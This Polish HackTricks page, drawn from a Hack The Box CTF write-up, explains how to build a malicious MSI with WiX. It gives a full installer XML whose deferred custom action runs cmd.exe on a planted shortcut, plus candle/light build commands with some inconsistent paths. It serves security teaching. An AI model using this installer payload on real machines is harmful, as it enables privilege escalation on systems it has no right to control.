# Tworzenie złośliwego MSI i uzyskanie uprawnień root

{{#include ../../banners/hacktricks-training.md}}

Utworzenie instalatora MSI zostanie wykonane przy użyciu wixtools, a konkretnie zostanie wykorzystane narzędzie [wixtools](http://wixtoolset.org). Warto wspomnieć, że podjęto próby użycia alternatywnych narzędzi do tworzenia MSI, jednak w tym konkretnym przypadku nie zakończyły się one powodzeniem.<sup>[[1]](#references)</sup>

Aby kompleksowo zapoznać się z przykładami użycia wix MSI, zaleca się odwiedzenie [tej strony](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Znajdują się tam różne przykłady demonstrujące użycie wix MSI.<sup>[[2]](#references)</sup>

Celem jest wygenerowanie MSI, który wykona plik lnk. Aby to osiągnąć, można użyć następującego kodu XML ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Należy pamiętać, że element Package zawiera atrybuty takie jak InstallerVersion i Compressed, które określają odpowiednio wersję instalatora oraz wskazują, czy pakiet jest skompresowany.

Proces tworzenia obejmuje użycie candle.exe, narzędzia z wixtools, w celu wygenerowania wixobject z pliku msi.xml. Należy wykonać następujące polecenie:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Dodatkowo warto wspomnieć, że w poście zamieszczono obraz przedstawiający polecenie i jego wynik. Możesz się do niego odwołać w celu uzyskania wskazówek wizualnych.<sup>[[1]](#references)</sup>

Ponadto light.exe, kolejne narzędzie z wixtools, zostanie użyte do utworzenia pliku MSI z obiektu wixobject. Wykonane polecenie jest następujące:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Podobnie jak w przypadku poprzedniego command, we wpisie zamieszczono obraz przedstawiający command i jego wynik.<sup>[[1]](#references)</sup>

Należy pamiętać, że chociaż to podsumowanie ma na celu dostarczenie cennych informacji, zaleca się zapoznanie z oryginalnym wpisem, aby uzyskać bardziej wyczerpujące szczegóły i dokładne instrukcje.<sup>[[1]](#references)</sup>

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
